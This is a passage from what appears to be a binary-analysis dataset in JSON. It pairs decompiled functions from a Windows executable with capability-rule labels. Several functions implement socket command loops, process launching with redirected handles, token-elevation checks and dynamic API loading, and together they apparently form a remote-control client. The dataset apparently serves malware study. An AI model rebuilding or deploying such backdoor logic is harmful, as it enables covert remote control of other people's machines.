sub.wsock32.dll_recv();\n                    } while (puVar4 != NULL);\n                    if (*(iVar1 + 0xd) != '\\0') break;\n                    uStackY4192 = 0x488594;\n                    fcn.0041be60();\n                    uStackY4192 = 0x4885a0;\n                    fcn.00475ed4();\n                }\n            }\n        }\n    }\ncode_r0x004885ad:\n    if (var_ch != NULL) {\n        uStackY4192 = 0x4885bb;\n        fcn.0040f94c();\n    }\n    if (var_10h != 0) {\n        uStackY4192 = 0x4885c9;\n        fcn.00464dc4();\n        uStackY4192 = 0x4885d1;\n        fcn.0040f94c();\n    }\n    uStackY4192 = 2;\n    puStackY4200 = 0x4885d9;\n    puStackY4196 = puVar2;\n    sub.wsock32.dll_shutdown();\n    puStackY4204 = 0x4885df;\n    puStackY4200 = puVar2;\n    sub.wsock32.dll_closesocket();\n    *in_FS_OFFSET = puStackY4200;\n    uStackY4192 = 0x488604;\n    puStackY4196 = 0x4885fc;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1496
    },
    "00488658": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00488658(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xd) != '\\0') {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 49
    },
    "004886dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004886dc(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x50) != '\\0') {\n        fcn.0048a6dc();\n    }\n    if (*(in_EAX + 0x51) != '\\0') {\n        fcn.0048a830();\n    }\n    if (*(in_EAX + 0x52) != '\\0') {\n        fcn.0048b9f0();\n    }\n    if (*(in_EAX + 0x53) != '\\0') {\n        sub.user32.dll_SendMessageA(0xffff, 0x112, 0xf170, 0xffffffff);\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "00488724": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00488724(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x50) != '\\0') {\n        fcn.0048a6dc();\n    }\n    if (*(in_EAX + 0x51) != '\\0') {\n        fcn.0048a830();\n    }\n    if (*(in_EAX + 0x52) != '\\0') {\n        sub.user32.dll_SendMessageA(0xffff, 0x112, 0xf170, 2);\n    }\n    if (*(in_EAX + 0x53) != '\\0') {\n        fcn.0048b9f0();\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "0048876c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0048876c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    int32_t *in_FS_OFFSET;\n    uchar uVar6;\n    ushort uStackY8236;\n    ushort uStackY8234;\n    int32_t iStackY8232;\n    uchar auStackY8220 [3976];\n    uint uStackY4244;\n    uchar *puStackY4236;\n    uint uStackY4232;\n    uint uStackY4228;\n    uchar *puStackY4224;\n    uchar *puStackY4220;\n    uint uStackY4216;\n    uchar *puStackY4212;\n    uchar *puStackY4208;\n    uchar *puStackY4204;\n    uint uStackY4200;\n    int32_t iStack4172;\n    uint uStack4168;\n    uchar *puStack4164;\n    int32_t var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack4164 = &stack0xfffffffc;\n    iVar4 = 2;\n    do {\n        iVar2 = iVar4;\n        iVar4 = iVar2 + -1;\n    } while (iVar2 + -1 != 0);\n    uStack4168 = 0x488aa5;\n    iStack4172 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffefb4;\n    puVar3 = sub.wsock32.dll_socket();\n    if (puVar3 != 0xffffffff) {\n        uStackY8236 = 2;\n        uStackY8234 = sub.wsock32.dll_htons();\n        iStackY8232 = sub.wsock32.dll_inet_addr();\n        if (iStackY8232 == -1) {\n            uStackY4200 = 0x48880c;\n            iVar4 = sub.wsock32.dll_gethostbyname();\n            if (iVar4 == 0) goto code_r0x00488a2f;\n            iStackY8232 = ***(iVar4 + 0xc);\n        }\n        uStackY4200 = 0x10;\n        puStackY4204 = &stack0xffffdfd4;\n        puStackY4212 = 0x488833;\n        puStackY4208 = puVar3;\n        sub.wsock32.dll_connect();\n        puStackY4212 = NULL;\n        uStackY4216 = 0x2000;\n        puStackY4220 = &stack0xffffdfe4;\n        uStackY4228 = 0x48884a;\n        iVar4 = sub.wsock32.dll_recv();\n        if (iVar4 != -1) {\n            uStackY4228 = 0x48885f;\n            fcn.00409d78();\n            uStackY4228 = 0x488875;\n            fcn.00405864();\n            uStackY4228 = 0x488883;\n            fcn.00475e38();\n            uStackY4228 = 0;\n            uStackY4232 = 0x2000;\n            puStackY4236 = &stack0xffffdfe4;\n            uStackY4244 = 0x48889a;\n            iVar4 = sub.wsock32.dll_recv();\n            if (iVar4 != -1) {\n                uStackY4244 = 0x4888ae;\n                fcn.00405584();\n                **0x495cbc = *(iVar2 + 0x44);\n                uStackY4244 = 0x4888bd;\n                fcn.00489358();\n                uStackY4244 = 0x4888c9;\n                var_14h = fcn.00404620();\n                uStackY4244 = 0x4888da;\n                var_18h = fcn.0041f9e0();\n                *(var_18h + 0xf) = 1;\n                uStackY4244 = 0x4888ee;\n                fcn.0041fbec();\n                uStackY4244 = 0x4888f9;\n                fcn.00489210();\n                uStackY4244 = 0x488901;\n                fcn.0041fe9c();\n                uStackY4244 = 0x488908;\n                fcn.00488724();\n                while (*(iVar2 + 0xd) == '\\0') {\n                    uStackY4200 = 0;\n                    puStackY4204 = 0x2000;\n                    puStackY4208 = &stack0xffffdfe4;\n                    uStackY4216 = 0x488924;\n                    iVar4 = sub.wsock32.dll_recv();\n                    uVar6 = iVar4 == 0;\n                    if (iVar4 < 1) break;\n                    do {\n                        uStackY4200 = 0x48893f;\n                        fcn.004895b0();\n                        uStackY4200 = 0;\n                        puStackY4208 = 0x48894b;\n                        fcn.0041b750(0, 0);\n                        puStackY4208 = 0x488959;\n                        fcn.0048d63c();\n                        puStackY4208 = 0x488967;\n                        fcn.0045f4ec();\n                        puStackY4208 = 0x488972;\n                        fcn.00405974();\n                        if (uVar6) {\n                            puStackY4208 = 0x48897c;\n                            fcn.0041be60();\n                            puStackY4212 = 0x488983;\n                            sub.kernel32.dll_Sleep_2();\n                        }\n                        uStackY4200 = 0x48898e;\n                        fcn.00405974();\n                    } while ((uVar6) && (uVar6 = *(iVar2 + 0xd) == '\\0',  uVar6));\n                    if (*(iVar2 + 0xd) != '\\0') break;\n                    uStackY4200 = 0x4889ab;\n                    fcn.004055c8();\n                    while( true ) {\n                        uStackY4200 = 0x4889bd;\n                        fcn.00403af4();\n                        uStackY4200 = 0x4889d0;\n                        puVar5 = (**(*var_14h + 0xc))();\n                        if (puVar5 == NULL) break;\n                        uStackY4200 = 0;\n                        puStackY4208 = &stack0xffffdfe4;\n                        uStackY4216 = 0x4889e9;\n                        puStackY4212 = puVar3;\n                        puStackY4204 = puVar5;\n                        sub.wsock32.dll_send();\n                        uStackY4216 = 0;\n                        puStackY4220 = 0x2000;\n                        puStackY4224 = &stack0xffffdfe4;\n                        uStackY4232 = 0x488a00;\n                        sub.wsock32.dll_recv();\n                        if ((puVar5 == NULL) || (*(iVar2 + 0xd) != '\\0')) break;\n                    }\n                    if (*(iVar2 + 0xd) != '\\0') break;\n                    uStackY4200 = 0x488a18;\n                    fcn.0041be60();\n                    uStackY4200 = 0x488a25;\n                    fcn.00475ed4();\n                }\n            }\n        }\n    }\ncode_r0x00488a2f:\n    uStackY4200 = 0x488a36;\n    fcn.004886dc();\n    if (var_18h != 0) {\n        uStackY4200 = 0x488a44;\n        cVar1 = fcn.00489214();\n        if (cVar1 != '\\0') {\n            uStackY4200 = 0x488a50;\n            fcn.004891f4();\n            uStackY4200 = 0x488a58;\n            fcn.0041fec4();\n        }\n    }\n    if (var_14h != NULL) {\n        uStackY4200 = 0x488a66;\n        fcn.0040f94c();\n    }\n    uStackY4200 = 2;\n    puStackY4208 = 0x488a71;\n    puStackY4204 = puVar3;\n    sub.wsock32.dll_shutdown();\n    puStackY4212 = 0x488a7a;\n    puStackY4208 = puVar3;\n    sub.wsock32.dll_closesocket();\n    *in_FS_OFFSET = puStackY4208;\n    uStackY4200 = 0x488aac;\n    puStackY4204 = 0x488a97;\n    fcn.00405554();\n    puStackY4204 = 0x488aa4;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1983
    },
    "00488cec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00488cec(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xd) != '\\0') {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 49
    },
    "00489214": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00489214(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xd) != '\\0') {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 49
    },
    "0048b0fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0048b0fc(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack928;\n    uint uStack924;\n    uchar *puStack920;\n    uint lpSecurityAttributes;\n    uint var_380h;\n    uint var_37ch;\n    int32_t hHandle;\n    int32_t var_374h;\n    uint var_368h;\n    uint var_33ch;\n    uint var_338h;\n    int32_t var_330h;\n    int32_t var_32ch;\n    uint var_323h;\n    uint lpFileName;\n    uint var_119h;\n    int32_t hObject;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    puStack920 = 0x48b115;\n    cVar1 = fcn.0040a274();\n    if (cVar1 == '\\0') {\n        var_1h._0_1_ = 0;\n    }\n    else {\n        puStack920 = 0x48b12f;\n        fcn.0040a930();\n        puStack920 = 0x48b13c;\n        fcn.0040a930();\n        puStack920 = 0x48b149;\n        fcn.0040a930();\n        uStack924 = 0x48b2eb;\n        iStack928 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffc60;\n        puStack920 = &fcn.0048b0fc::var_1h + 1;\n        fcn.00403af4();\n        lpSecurityAttributes = 0xc;\n        var_380h = 0;\n        var_37ch = 0xffffffff;\n        var_10h = sub.kernel32.dll_CreateFileA_1\n                            (&fcn.0048b0fc::lpFileName, 0xc0000000, 3, &fcn.0048b0fc::lpSecurityAttributes, 4, 0x100, 0)\n        ;\n        if (var_10h == -1) {\n            var_1h._0_1_ = 0;\n            fcn.00404f70();\n        }\n        else {\n            hObject = sub.kernel32.dll_CreateFileA_1\n                                (&fcn.0048b0fc::var_323h, 0xc0000000, 3, &fcn.0048b0fc::lpSecurityAttributes, 2, 0x100, \n                                 0);\n            if (hObject == -1) {\n                var_1h._0_1_ = 0;\n                fcn.00404f70();\n            }\n            else {\n                fcn.00403af4();\n                var_368h = 0x44;\n                var_33ch = 0x101;\n                var_338h._0_2_ = 0;\n                var_32ch = hObject;\n                var_330h = var_10h;\n                iVar2 = sub.kernel32.dll_CreateProcessA\n                                  (0, &fcn.0048b0fc::var_119h, 0, 0, 0xffffffff, 0x110, 0, 0, &fcn.0048b0fc::var_368h, \n                                   &fcn.0048b0fc::hHandle);\n                var_1h._0_1_ = '\\x01' - (iVar2 == 0);\n                if (var_1h != '\\0') {\n                    iVar2 = hHandle;\n                    sub.kernel32.dll_WaitForSingleObject(hHandle, 0xffffffff);\n                    var_8h = hHandle;\n                    var_ch = var_374h;\n                    uVar3 = 0;\n                    *in_FS_OFFSET = iVar2;\n                    if (hObject != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(hObject, 0x48b2f2);\n                    }\n                    if (var_10h != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(var_10h);\n                    }\n                    if (var_ch != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(var_ch);\n                    }\n                    if (var_8h != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(var_8h);\n                    }\n                    return uVar3;\n                }\n                var_1h._0_1_ = 0;\n                fcn.00404f70();\n            }\n        }\n    }\n    return var_1h;\n}\n",
        "token_count": 1057
    },
    "0048b954": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048b954(uint *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffcc;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x48b96c;\n    fcn.004059cc();\n    puStack28 = 0x48b974;\n    fcn.004059cc();\n    uStack32 = 0x48b9df;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *param_1 = 0;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc();\n    iVar2 = sub.kernel32.dll_LoadLibraryA(uVar1);\n    if ((iVar2 != 0) && (iVar2 = sub.kernel32.dll_GetModuleHandleA_2(uVar1),  iVar2 != 0)) {\n        uVar1 = fcn.004059dc();\n        uVar1 = sub.kernel32.dll_GetProcAddress_1(iVar2, uVar1);\n        *param_1 = uVar1;\n        in_stack_ffffffcc = iVar2;\n    }\n    *in_FS_OFFSET = in_stack_ffffffcc;\n    fcn.00405554(0x48b9e6);\n    return;\n}\n",
        "token_count": 332
    },
    "0048c158": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0048c2c6)\n\nvoid fcn.0048c158(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uint *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint ReturnLength;\n    int32_t var_14h;\n    int32_t TokenInformation;\n    uint TokenHandle;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    puStack60 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack52 = 0x48c303;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    uStack64 = 0x48c29e;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = &fcn.0048c158::TokenHandle;\n    uStack76 = 8;\n    uStack80 = 0x48c193;\n    uStack80 = sub.kernel32.dll_GetCurrentProcess();\n    puStack84 = 0x48c199;\n    iVar1 = sub.advapi32.dll_OpenProcessToken();\n    if (iVar1 == 0) {\n        puStack84 = 0x48c294;\n        fcn.00405584();\n        *in_FS_OFFSET = uStack80;\n        puStack72 = 0x48c2c0;\n        fcn.00409b84();\n        *in_FS_OFFSET = puStack84;\n        uStack76 = 0x48c30a;\n        uStack80 = 0x48c2fa;\n        fcn.00405530();\n        uStack80 = 0x48c302;\n        fcn.00405530();\n        return;\n    }\n    uStack88 = 0x48c280;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    iVar1 = sub.advapi32.dll_GetTokenInformation\n                      (TokenHandle, 0x12, &fcn.0048c158::TokenInformation, 4, &fcn.0048c158::ReturnLength);\n    if (iVar1 == 0) {\n        fcn.00405584();\n    }\n    else if (TokenInformation == 1) {\n        fcn.004055c8();\n    }\n    else if (TokenInformation == 2) {\n        fcn.004055c8();\n    }\n    else if (TokenInformation == 3) {\n        fcn.004055c8();\n    }\n    else {\n        fcn.004055c8();\n    }\n    uVar2 = TokenHandle;\n    iVar1 = sub.advapi32.dll_GetTokenInformation\n                      (TokenHandle, 0x14, &fcn.0048c158::var_14h, 4, &fcn.0048c158::ReturnLength);\n    if (iVar1 == 0) {\n        fcn.00405584();\n    }\n    else if (var_14h == 0) {\n        fcn.00405584();\n    }\n    else {\n        fcn.00405584();\n    }\n    *in_FS_OFFSET = uVar2;\n    sub.kernel32.dll_CloseHandle_1(TokenHandle, 0x48c294);\n    return;\n}\n",
        "token_count": 822
    },
    "0048ca6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0048ca6c(float10 param_1)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    float10 fVar2;\n    int64_t iVar3;\n    uint arg_8h;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_20h;\n    uint *var_14h;\n    uint var_10h;\n    uint var_ch;\n    double dStack12;\n    \n    puStack48 = &stack0xfffffffc;\n    var_ch = 0;\n    uStack52 = 0x48cb3b;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    dStack12 = param_1;\n    iVar1 = -1;\n    do {\n        dStack12 = dStack12 / *0x48cb4c;\n        iVar1 = iVar1 + 1;\n        iVar3 = fcn.0040345c();\n        if (iVar3 == 0) {\n            dStack12 = dStack12 * *0x48cb4c;\n            break;\n        }\n    } while (iVar1 < 4);\n    fVar2 = dStack12;\n    arg_8h = SUB104(fVar2, 0);\n    fcn.00403420(arg_8h, fVar2 >> 0x20, fVar2 >> 0x40, &var_ch);\n    _var_20h = dStack12;\n    var_14h = &var_20h;\n    var_10h._0_1_ = 3;\n    fcn.0040afa0(arg_8h);\n    fcn.00405864();\n    *in_FS_OFFSET = arg_8h;\n    fcn.00405530(0xcb42);\n    return;\n}\n",
        "token_count": 410
    },
    "0048d03c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0048d0e7)\n\nvoid __fastcall fcn.0048d03c(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack328;\n    uint uStack324;\n    uchar *puStack320;\n    uint uStack316;\n    uint uStack312;\n    uchar *puStack308;\n    uint var_120h;\n    uint var_11ch;\n    uint var_115h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack320 = &stack0xfffffffc;\n    puStack308 = 0x48d064;\n    var_8h = param_2;\n    fcn.004059cc();\n    uStack312 = 0x48d13c;\n    uStack316 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec4;\n    uStack324 = 0x48d0ff;\n    uStack328 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffeb8;\n    uVar2 = 0;\n    puStack308 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc(&fcn.0048d03c::var_115h, 0x105, 0, &fcn.0048d03c::var_ch, &fcn.0048d03c::var_10h, 0, 0);\n    sub.kernel32.dll_GetVolumeInformationA();\n    fcn.004057a0();\n    fcn.00409b84();\n    fcn.00405584();\n    *in_FS_OFFSET = uVar1;\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x48d143);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 425
    },
    "0048d4ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048d4ec(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EDX;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint var_560h;\n    uint var_55ch;\n    uint var_15ch;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    fcn.004059cc();\n    arg_8h_00 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffa84;\n    fcn.00405530();\n    fcn.00405530();\n    cVar1 = fcn.0040a274();\n    if (cVar1 != '\\0') {\n        fcn.00403770();\n        **0x495bd8 = 0;\n        fcn.00403e68();\n        fcn.0040305c();\n        iVar2 = 0;\n        fcn.00403e90();\n        fcn.0040305c();\n        while( true ) {\n            fcn.00403af4();\n            arg_8h_00 = &var_10h;\n            fcn.004038d8(arg_8h_00);\n            fcn.0040305c();\n            if (var_10h < 1) break;\n            iVar2 = iVar2 + 1;\n            fcn.004057a0();\n            fcn.00405818();\n            if ((in_EDX <= iVar2) || (var_10h == 0)) break;\n        }\n        fcn.00405584();\n        fcn.00403918();\n        fcn.0040305c();\n    }\n    *in_FS_OFFSET = arg_8h_00;\n    fcn.00405530();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 431
    },
    "0048df84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t * fcn.0048df84(void)\n\n{\n    uint32_t *in_EAX;\n    int32_t iVar1;\n    char *pcVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint arg_8h;\n    uint32_t *puStack100;\n    \n    iVar1 = sub.advapi32.dll_IsValidSid();\n    if (iVar1 != 0) {\n        pcVar2 = sub.advapi32.dll_GetSidIdentifierAuthority();\n        puVar3 = sub.advapi32.dll_GetSidSubAuthorityCount();\n        uVar5 = *puVar3;\n        uVar4 = uVar5 * 0xc + 0x1c;\n        if (uVar4 < *in_EAX || uVar4 == *in_EAX) {\n            fcn.0040af20(0);\n            if ((*pcVar2 == '\\0') && (pcVar2[1] == '\\0')) {\n                arg_8h = 0;\n                fcn.0040a870();\n                fcn.0040af20(arg_8h);\n            }\n            else {\n                arg_8h = 5;\n                fcn.0040a870();\n                fcn.0040af20(arg_8h);\n            }\n            fcn.0040a870();\n            do {\n                sub.advapi32.dll_GetSidSubAuthority();\n                fcn.0040af20(arg_8h);\n                fcn.0040a870();\n                uVar5 = uVar5 - 1;\n            } while (uVar5 != 0);\n            puStack100 = 0xffffffff;\n        }\n        else {\n            *in_EAX = uVar4;\n            sub.kernel32.dll_SetLastError(0x7a);\n            puStack100 = in_EAX;\n        }\n    }\n    return puStack100;\n}\n",
        "token_count": 413
    },
    "0048e7b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0048e7f6)\n\nvoid fcn.0048e7b0(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x48e7cc;\n    fcn.004059cc();\n    uStack36 = 0x48e831;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.0048e630();\n    fcn.00409b84();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x48e838;\n    uStack36 = 0x48e830;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 216
    },
    "004900ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004900ac(void)\n\n{\n    uint *in_FS_OFFSET;\n    bool bVar1;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x49011e;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    bVar1 = *0x498918 == 0;\n    *0x498918 = *0x498918 + -1;\n    if (bVar1) {\n        fcn.0040521c();\n        fcn.00405244();\n        if (*0x4987f5 != '\\0') {\n            fcn.00405584();\n        }\n        fcn.0040e200();\n        fcn.00406eac();\n        fcn.0040e31c();\n        fcn.0040f4b4();\n        fcn.0040ebd4();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 232
    },
    "00402370": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00402370(uint param_1, uint8_t *param_2)\n\n{\n    int64_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    iVar1 = (in_EAX + 1) * 0x89705f41;\n    uVar3 = iVar1 >> 0x20;\n    uVar2 = uVar3 >> 0x1d;\n    uVar4 = (uVar3 & 0x1fffffff) * 5 + (iVar1 >> 0x1e);\n    *param_2 = iVar1 >> 0x3d | 0x30;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar2 = uVar2 | uVar4 >> 0x1c;\n    *param_2 = uVar4 >> 0x1c | 0x30;\n    uVar3 = (uVar4 & 0xfffffff) * 5;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar4 = (uVar4 & 0xfffffff) * 5 & 0x7ffffff;\n    uVar2 = uVar2 | uVar3 >> 0x1b;\n    *param_2 = uVar3 >> 0x1b | 0x30;\n    uVar3 = uVar4 * 5;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar4 = uVar4 * 5 & 0x3ffffff;\n    uVar2 = uVar2 | uVar3 >> 0x1a;\n    *param_2 = uVar3 >> 0x1a | 0x30;\n    uVar3 = uVar4 * 5;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar4 = uVar4 * 5 & 0x1ffffff;\n    uVar2 = uVar2 | uVar3 >> 0x19;\n    *param_2 = uVar3 >> 0x19 | 0x30;\n    uVar3 = uVar4 * 5;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar4 = uVar4 * 5 & 0xffffff;\n    uVar2 = uVar2 | uVar3 >> 0x18;\n    *param_2 = uVar3 >> 0x18 | 0x30;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar3 = uVar4 * 5 >> 0x17;\n    uVar4 = uVar4 * 5 & 0x7fffff;\n    uVar2 = uVar2 | uVar3;\n    *param_2 = uVar3 | 0x30;\n    param_2 = param_2 + (uVar2 != 0);\n    uVar3 = uVar4 * 5 >> 0x16;\n    uVar4 = uVar4 * 5 & 0x3fffff;\n    uVar2 = 